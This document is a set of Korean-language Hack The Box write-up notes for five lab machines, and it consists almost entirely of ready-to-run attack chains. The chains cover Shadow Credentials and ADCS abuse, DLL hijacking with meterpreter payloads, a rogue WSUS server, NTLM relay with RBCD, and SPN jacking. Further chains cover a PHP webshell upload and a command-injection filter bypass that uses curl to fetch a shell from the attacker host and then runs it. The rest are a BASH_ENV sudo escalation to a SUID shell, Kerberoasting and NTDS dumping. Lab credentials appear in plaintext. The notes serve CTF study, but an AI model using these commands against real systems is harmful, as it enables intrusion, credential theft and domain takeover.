# HTB 라이트업 배치4 추출 기법 (고급 AD/Windows)

### Logging (Windows AD, Medium, 2026) DC logging.htb + WSUS(8530/8531)  [고급 AD 풀체인]
- assumed-breach wallace.everette:Welcome2026@. nmap DC + 8530/8531(WSUS 기본). /etc/hosts logging.htb DC01.logging.htb
- smbclient -U wallace.everette -L //logging.htb → Logs 공유(도메인유저 읽기) + WSUSTemp
  Logs/IdentitySync_Trace.log → svc_recovery:Em3rg3ncyPa$$2025 (BindPass 평문)
- netexec smb -u svc_recovery → STATUS_ACCOUNT_RESTRICTION = Protected Users(NTLM 차단, Kerberos만)
  확인: nxc ldap -u wallace --groups "Protected Users"
- 비번 패턴 Em3rg3ncyPa$$<year> → 2026 으로 증가. ntpdate -s logging.htb (시계동기화 필수)
  impacket getTGT.py logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' → ccache; export KRB5CCNAME=
- bloodhound-python -k -u svc_recovery -p ... -d LOGGING.HTB -ns {t} -dc DC01.LOGGING.HTB -c All
  → svc_recovery 가 MSA msa_health 에 GenericWrite
- Shadow Credentials 공격(msDS-KeyCredentialLink): bloodyAD --host dc01 -d logging.htb -u svc_recovery -k
  add shadowCredentials msa_health → cert pem → PKINITtools gettgtpkinit.py -cert-pem -key-pem → TGT
  → getnthash.py -key <AS-REP key> → msa_health NTLM. msa_health∈Remote Management Users
  → evil-winrm -i {t} -u msa_health -H <hash>
- lateral: msa_health Documents/monitor.ps1 → UpdateChecker Agent 작업(jaylee.clifton 권한, PT3M 3분마다)
  C:\ProgramData\UpdateMonitor 쓰기가능(icacls BUILTIN\Users:WD). 작업이 settings_update.dll 로드(DLL 검색순서 하이재킹)
  단, export 함수 PreUpdateCheck 필요. dllhijack.c (i686-w64-mingw32-gcc -shared), msfvenom meterpreter rev.exe
  → Settings_Update.zip 로 압축 업로드 → 3분 후 jaylee.clifton 셸 → user.txt
- privesc: jaylee Tickets/Incident report → ForceSync 작업, WUServer=https://wsus.logging.htb:8531(DNS 없음)
  reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer 로 확인
  wallace 가 DNS 레코드 생성권: krbrelayx/dnstool.py -u 'logging.htb\wallace.everette' -p ... {atk} -a add -r wsus.logging.htb -d {atk}
- ADCS ESC17: jaylee∈IT 그룹, UpdateSrv 템플릿 enroll(ESC17: EnrolleeSuppliesSubject + Server Authentication)
  Rubeus.exe tgtdeleg /nowrap → ticket → ticketConverter.py → ccache(jaylee)
  certipy-esc17 find -vulnerable; certipy-esc17 req -u jaylee -k -target DC01 -template UpdateSrv -ca logging-DC01-CA -dns wsus.logging.htb → wsus.pfx
  openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes
- Rogue WSUS: sudo wsuks -t {t} --serve-only --WSUS-Server dc01.logging.htb --tls-cert wsus.pem
  -c '/accepteula /s cmd.exe "/c c:\programdata\updatemonitor\rev1.exe"'
  → ForceSync 가 가짜 업데이트 pull → PsExec 로 SYSTEM 실행 → meterpreter SYSTEM → root.txt
- 교훈(고급 AD): Protected Users=Kerberos전용. 비번패턴 연도증가. Shadow Credentials(GenericWrite/WriteProperty on user/MSA).
  DLL 검색순서 하이재킹(쓰기가능 경로+export). DNS레코드 악용(dnstool). ADCS ESC17(서버인증 템플릿). Rogue WSUS(wsuks).

### Pirate (Windows AD, Hard, 2026) DC pirate.htb + Hyper-V(2179)  [Hard AD 풀체인]
- assumed breach pentest:p3nt3st2025!&. nmap DC + 2179 vmrdp(Hyper-V). /etc/hosts pirate.htb dc01
- bloodhound-python -d pirate.htb -c all. Domain Computers: WEB01/MS01/EXCH01 + gMSA_ADCS_prod$/gMSA_ADFS_prod$
- EXCH01/MS01 ∈ Pre-Windows 2000 Compatible Access → 비번=컴퓨터명 소문자(ms01$→ms01)
  nxc smb -u MS01$ -p ms01 → STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(pre-created, 비번만료)
  → impacket-changepasswd -p rpc-samr pirate.htb/'MS01$':ms01@{t} -newpass 'P@$$w0rd!' (만료비번 변경)
- MS01 ∈ Domain Secure Servers → ReadGMSAPassword over gMSA. gMSADumper.py -u 'MS01$' -p ... -d pirate.htb
  → gMSA NTLM 해시. gMSA ∈ Remote Management Users → evil-winrm -u 'gMSA_ADFS_prod$' -H <hash> → DC01 셸
- lateral: DC=Hyper-V host(192.168.100.1), 격리망 192.168.100.0/24, WEB01=192.168.100.2. gMSA_ADFS has CanPSRemote on WEB01
  Ligolo-ng 피벗: sudo ip tuntap add user $(whoami) mode tun ligolo; ip link set ligolo up; ./proxy -selfcert -laddr 0.0.0.0:443
  win-agent.exe -connect {atk}:443 -ignore-cert → session start → sudo ip route add 192.168.100.0/24 dev ligolo
- WEB01: LmCompatibilityLevel=2(NTLMv1 허용) + WebClient(WebDAV). nxc smb web01 -M webdav 확인
  NTLMv1 은 MIC 없음 → 릴레이 가능. dnstool.py 로 단일라벨 DNS 레코드 추가(relay.pirate.htb → atk)
  impacket-ntlmrelayx -t ldap://192.168.100.1 -smb2support --delegate-access (RBCD 생성)
  PetitPotam.py -u 'gMSA_ADFS_prod$' -hashes :<hash> relay@80/asd 192.168.100.2 (WEB01 강제인증 HTTP→WebClient)
  → ntlmrelayx 가 새 머신계정 생성+msDS-AllowedToActOnBehalfOfOtherIdentity(RBCD) on WEB01$
  impacket-getST pirate.htb/'NEWPC$':'pw' -spn cifs/web01 -impersonate Administrator (S4U2Self+S4U2Proxy)
  → export KRB5CCNAME; impacket-wmiexec 'Administrator'@web01 -k -no-pass → user.txt(a.white Desktop)
- privesc: impacket-secretsdump 'Administrator'@web01 -k -no-pass → DefaultPassword(LSA AutoLogon) a.white:E2nvAOKSz5Xz2MJu
  BloodHound: a.white ForceChangePassword over a.white_adm(계정 계층모델). impacket-findDelegation →
  a.white_adm = Constrained Delegation w/ Protocol Transition to HTTP/WEB01, ∈ IT 그룹(WriteSPN over all computers incl DC01)
- SPN Jacking: net rpc password "a.white_adm" -U pirate.htb/a.white%E2nvAOKSz5Xz2MJu -S {t} (비번리셋)
  addspn.py -u a.white_adm -t 'WEB01$' -c (HTTP/WEB01 제거) → addspn.py -t 'DC01$' --spn "HTTP/WEB01" (DC01 에 등록)
  impacket-getST -spn 'HTTP/WEB01' -impersonate Administrator 'pirate.htb/a.white_adm:Password@1' -altservice cifs/DC01
  (altservice 로 티켓 서비스명 cifs/DC01 로 재작성, 암호화는 DC01$ 키) → wmiexec Administrator@dc01 -k → root.txt
- 교훈(Hard AD): Pre-Win2000 계정 비번=이름. changepasswd rpc-samr(만료). gMSADumper. Ligolo 피벗(격리망).
  NTLMv1(LmCompatibilityLevel)=릴레이가능. PetitPotam+ntlmrelayx --delegate-access=RBCD. AutoLogon=DefaultPassword LSA.
  SPN Jacking(WriteSPN+constrained delegation+getST -altservice).

### Environment (Linux, Medium, 2025) 22 ssh / 80 nginx(environment.htb)  [Laravel 체인]
- environment.htb → /etc/hosts. feroxbuster → /login /upload /mailing. /upload GET → Method Not Allowed
  → Laravel 11.30.0 버전 노출(에러페이지)
- CVE-2024-52301(Laravel env 조작): ?--env=<name> 쿼리로 $_SERVER['argv'] 주입 → App::environment() 변경
  테스트: environment.htb/?--env=preprod → 푸터 텍스트 변경 확인
- 로그인 우회: POST /login 의 remember 를 비불린값으로 → Internal Server Error → 소스 노출
  (routes/web.php: if App::environment()=="preprod" 이면 자격검사 생략 후 /management/dashboard 리다이렉트)
  → POST /login?--env=preprod (아무 email/password) → 대시보드 접근
- 대시보드 Profile 사진 업로드 = Laravel File Manager → CVE-2024-2154 RCE. name 파라미터 변조로 식별
  PHP 웹셸 업로드: 이미지 바디에 <?php system($_GET['cmd']);?> 삽입, filename=phpwebshell.png.php (확장자 뒤 .)
  → http://environment.htb/storage/files/phpwebshell.png.php?cmd=... → RCE → base64 리버스셸 → www-data
- user: /home/hish/user.txt. lateral: ~/.gnupg 755(전역읽기, private-keys-v1.d 노출) + backup/keyvault.gpg
  zip -r gnupg.zip /home/hish/.gnupg; cp keyvault.gpg; python3 -m http.server → 로컬 다운로드
  → gpg --import 후 gpg -d keyvault.gpg → hish 비번 복호화 → su hish
- privesc: sudo -l → hish 가 특정 스크립트 root 실행 가능(스크립트 자체는 무해).
  env_keep 로 BASH_ENV 보존됨 → BASH_ENV=/tmp/x.sh (echo 'cp /bin/bash /tmp/b;chmod +s /tmp/b' > /tmp/x.sh)
  sudo BASH_ENV=/tmp/x.sh <script> → bash 가 비대화형 시작 시 BASH_ENV 실행 → root (SUID bash)
- 교훈: 앱 버전→CVE. ?--env= 는 Laravel argv 주입. filename 이중확장자(.png.php) 업로드 우회.
  ~/.gnupg 퍼미션 노출→키 탈취 복호화. sudo env_keep BASH_ENV → 비대화형 bash 임의실행.

### Nocturnal (Linux, Medium, 2025) 22 ssh / 80 nginx(nocturnal.htb)
- 회원가입/로그인 → dashboard 파일업로드(pdf/doc/docx/xls/xlsx/odt만). 업로드후 view.php?username=kavi&file=kavi.pdf
- IDOR: username 파라미터 변조로 타 사용자 파일 열람. ffuf -u 'view.php?username=FUZZ&file=kavi.pdf'
  -w Usernames/Names/names.txt -H 'Cookie: PHPSESSID=...' -fs <에러크기> → amanda
  view.php?username=amanda → privacy.odt 다운 → 평문 임시비번 arHkG7HAI68X8s1J
- amanda 로그인 → Admin Panel. PHP 소스 뷰 + Create Backup(비번보호 ZIP)
- 명령주입: Create Backup 이 사용자 비번을 zip 명령에 사용. admin.php 소스 cleanEntry blacklist=[; & | $ space ` { } &&]
  공백 차단이나 탭(%09)/개행(%0a) 미차단 → 우회. Burp 로:
  password=kavi%0acurl%09http://{atk}/shell%09-o%09/tmp/shell&backup=  (curl 로 셸 다운)
  password=kavi%0abash%09/tmp/shell&backup=  → nc -lvnp → www-data
- lateral: 웹루트 nocturnal_database.db(SQLite). sqlite3 nocturnal_database.db → .tables(uploads,users)
  → SELECT * FROM users → 해시 크랙 → tobias:<비번> → ssh tobias@{t} → user.txt
- privesc: 내부 ISPConfig(ss -tln 내부포트, ssh -L 포워딩) → CVE-2023-46818(인증후 PHP 샌드박스 우회 RCE)
  → root. (기본자격 admin:<tobias비번 재사용> 가능)
- 교훈: IDOR 파라미터(username/id)→ffuf 열거. 명령주입 공백필터는 탭%09/개행%0a/${IFS} 우회.
  웹루트 SQLite(.db) 는 sqlite3 로 자격 탈취. 내부 앱 버전→CVE.

### Voleur (Windows AD, Medium, 2025) DC voleur.htb, NTLM 비활성, SSH 2222(Linux subsystem)
- assumed breach ryan.naylor:HollowOct31Nyt. NTLM 비활성 → nxc smb 시 STATUS_NOT_SUPPORTED → Kerberos 필수
  /etc/hosts DC.voleur.htb voleur.htb DC; nxc smb DC.voleur.htb -u .. -p .. -k --generate-krb5-file voleur.krb5
  → /etc/krb5.conf 작성; sudo ntpdate {t} (시계동기화)
- nxc smb -k --shares → IT 공유 읽기 → --spider IT --regex . → Access_Review.xlsx → --get-file 다운로드
  암호보호 xlsx: office2john Access_Review.xlsx > hash; john -w rockyou → football1 → 열기
  → 사용자/서비스계정+자격(svc_ldap:M1XyC9pW7qT5Vn, svc_iis:N5pXyW1VqM7CZ8, todd.wolfe[삭제됨]:NightT1meP1dg3on14)
- nxc smb -u user.txt -p pass.txt -k --continue-on-success → svc_ldap, svc_iis 유효
- bloodhound-python -k -u ryan.naylor -d voleur.htb -c all --dns-tcp → svc_ldap WriteSPN over svc_winrm
- targeted Kerberoasting: impacket-getTGT voleur.htb/svc_ldap; export KRB5CCNAME=svc_ldap.ccache
  targetedKerberoast.py -d voleur.htb --dc-host DC -u svc_ldap@voleur.htb -k → svc_winrm $krb5tgs$
  hashcat -m13100 rockyou → AFireInsidedeOzarctica980219afi
  impacket-getTGT voleur.htb/svc_winrm; evil-winrm -i dc.voleur.htb -r VOLEUR.HTB → user.txt
- lateral(AD 휴지통 복원): svc_ldap ∈ Restore Users 그룹. RunasCs.exe 로 svc_ldap 셸(logon type)
  Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'
  → 삭제된 todd.wolfe 발견. Restore-ADObject -Identity '<DN of deleted>' → 복원
  impacket-getTGT voleur.htb/todd.wolfe (xlsx 비번 NightT1meP1dg3on14)
- privesc(DPAPI→NTDS): todd.wolfe → DPAPI 보호 자격 blob 복호화(impacket-dpapi, masterkey+user비번)
  → 상위계정. SSH 키(backup 서비스계정) → ssh -p 2222 (WSL Linux subsystem)
  → NTDS.dit + SYSTEM + SECURITY 백업파일 확보 → impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
  → Administrator NT 해시 → PtH: evil-winrm -u Administrator -H <hash> → root
- 교훈: NTLM 비활성=Kerberos 전용(-k, krb5.conf, ntpdate). office2john/xlsx. targeted Kerberoast(WriteSPN→SPN설정→roast).
  AD 휴지통(Restore Users+Restore-ADObject). DPAPI(impacket-dpapi). NTDS.dit 오프라인 덤프(secretsdump LOCAL).
